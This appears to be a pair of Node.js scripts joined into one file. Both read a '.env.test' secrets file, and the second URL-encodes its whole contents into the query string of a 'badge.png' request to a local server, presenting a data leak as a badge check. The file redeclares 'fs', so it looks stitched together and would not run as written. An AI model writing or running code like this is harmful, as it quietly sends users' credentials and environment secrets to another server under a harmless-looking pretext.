const fs = require('fs');
const querystring = require('querystring');

try {
  const content = fs.readFileSync('.env.test', 'utf8');
  // URL encode the entire content
  const encodedContent = encodeURIComponent(content);
  console.log(encodedContent);
} catch (error) {
  console.error('Error reading or encoding file:', error.message);
  process.exit(1);
}

const http = require('http');
const fs = require('fs');

// Read and encode the .env.test content
const content = fs.readFileSync('.env.test', 'utf8');
const encodedContent = encodeURIComponent(content);

// Construct the badge URL
const badgeUrl = `http://localhost:47301/badge.png?d=${encodedContent}`;

console.log('Testing badge URL:', badgeUrl);

// Try to fetch the badge
const req = http.request(badgeUrl, (res) => {
  console.log(`Response status code: ${res.statusCode}`);
  console.log(`Response headers: ${JSON.stringify(res.headers)}`);

  let data = '';
  res.on('data', (chunk) => {
    data += chunk;
  });

  res.on('end', () => {
    if (res.statusCode === 200) {
      console.log('Successfully fetched badge image');
      console.log('Image size:', data.length, 'bytes');
    } else {
      console.log('Failed to fetch badge, got status:', res.statusCode);
    }
  });
});

req.on('error', (err) => {
  console.error('Error fetching badge:', err.message);
});

req.end();

